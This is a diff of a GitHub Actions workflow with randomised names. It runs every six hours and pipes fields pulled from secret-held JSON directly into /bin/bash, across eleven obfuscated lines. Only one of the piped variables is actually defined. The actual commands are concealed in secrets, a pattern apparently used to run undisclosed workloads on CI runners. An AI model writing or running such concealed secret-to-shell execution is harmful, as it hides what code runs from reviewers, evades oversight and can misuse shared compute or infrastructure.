@@ -1,9 +1,9 @@
 name: yangtianbao2001
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 0/6 * * *'
-
+    - cron: '24 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,10 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangtianbao2001
         env:
-          h60086: ${{ secrets.h60086 }}
+          dugg1050: ${{ secrets.dugg1050 }}
         run: |
-          echo $h60086 | jq -r .smagn7 | /bin/bash
-          echo $trmg93434 | jq -r .vuqu8 | /bin/bash
-          echo $g393 | jq -r .dfqc48 | /bin/bash
-          echo $oc1613 | jq -r .nds106 | /bin/bash
+          echo $dugg1050 | jq -r .i34 | /bin/bash
+          echo $tqbr4518 | jq -r .qfcwv01 | /bin/bash
+          echo $at567 | jq -r .rn222 | /bin/bash
+          echo $n75 | jq -r .ohtzx175 | /bin/bash
+          echo $lekq0 | jq -r .lhal41 | /bin/bash
+          echo $x30365 | jq -r .g5022 | /bin/bash
+          echo $nhc487 | jq -r .g6 | /bin/bash
+          echo $nhzef4406 | jq -r .cq5 | /bin/bash
+          echo $fmhj3134 | jq -r .gwk7722 | /bin/bash
+          echo $qhad14 | jq -r .xp4641 | /bin/bash
+          echo $e0 | jq -r .rrq633 | /bin/bash
 
